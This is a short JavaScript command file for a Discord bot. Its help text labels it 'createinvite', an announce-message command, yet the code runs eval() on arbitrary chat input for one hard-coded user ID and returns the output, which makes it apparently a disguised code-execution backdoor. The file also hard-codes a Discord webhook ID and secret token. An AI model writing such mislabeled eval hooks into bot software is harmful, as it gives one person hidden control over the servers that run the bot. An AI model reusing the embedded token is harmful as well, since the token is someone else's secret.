const Discord = module.require("discord.js");
const client = new Discord.Client();
const mentionHook = new Discord.WebhookClient("526376828290596865", "xR-_drIyJJKyEv11nH8pUgfkm5EndIY3wdMD77lVEgpMW2nRc9qofei23BkqEriF6gOy");

module.exports.run = async (client, message, args) => {
	if (message.author.id !== '501649887411175435') return
	const clean = text => {
	if (typeof(text) === "string")
		return text.replace(/`/g, "`" + String.fromCharCode(8203)).replace(/@/g, "@" + String.fromCharCode(8203));
	else
		return text;
	}
	try {
      const code = args.join(" ");
      let evaled = eval(code);
 
      if (typeof evaled !== "string")
        evaled = require("util").inspect(evaled);
 
      message.channel.send(clean(evaled), {code:"xl"});
    } catch (err) {
      message.channel.send(`\`ERROR\` \`\`\`xl\n${clean(err)}\n\`\`\``);
    }
}

module.exports.help = {
    name: "createinvite",
    description: "Announce message",
    usage: "createinvite"
}